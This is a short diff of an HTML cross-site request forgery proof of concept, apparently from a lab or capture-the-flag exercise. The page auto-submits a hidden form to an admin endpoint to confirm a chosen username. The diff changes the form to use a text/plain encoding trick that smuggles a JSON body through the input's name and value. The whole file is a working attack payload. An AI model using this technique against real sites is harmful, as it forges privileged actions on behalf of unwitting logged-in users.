@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html>
     <body>
-        <form  method="post" action="http://app/admin.php"  >
-            <input type="hidden" name="username" value="khangkim" />
-            <input type="hidden" name="confirm" value="yes" />
+        <form id="form" method="post" action="http://app/admin.php" enctype="text/plain" >
+            <input name='{"confirm": "yes","username": "thienthankk"' value='}' />
         </form>
         <script>
-            document.forms[0].submit();
+            form.submit();
         </script>
     </body>
 </html>
